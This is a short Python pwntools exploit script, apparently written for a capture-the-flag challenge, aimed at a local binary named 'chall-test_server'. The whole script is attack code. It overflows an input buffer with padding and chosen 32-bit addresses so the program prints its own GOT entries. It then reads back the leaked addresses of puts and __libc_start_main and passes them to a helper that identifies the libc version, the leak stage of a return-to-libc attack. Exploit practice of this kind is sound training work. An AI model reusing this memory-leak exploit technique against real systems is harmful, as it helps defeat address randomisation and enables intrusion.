from pwn import *

import TheNight

import sys

target = process("./chall-test_server")
payload = ""
payload += "000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x80490f0)
payload += p32(0x80490f0)
payload += p32(0x804c018)
payload += p32(0x804c020)

target.sendline(payload)

target.recvuntil("Input some text: ")
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersion("puts", gotAddress0, "__libc_start_main", gotAddress1)
